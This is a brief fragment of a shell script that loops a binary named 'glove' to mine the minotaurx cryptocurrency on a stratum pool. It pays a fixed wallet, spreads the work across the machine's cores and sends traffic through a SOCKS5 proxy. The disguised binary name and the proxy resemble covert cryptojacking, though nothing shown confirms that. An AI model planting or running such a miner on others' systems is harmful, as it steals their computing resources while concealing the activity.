...
while true
do
./glove -a minotaurx -o stratum+tcp://stratum.cryptopool.site:7020 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
sleep 10
done
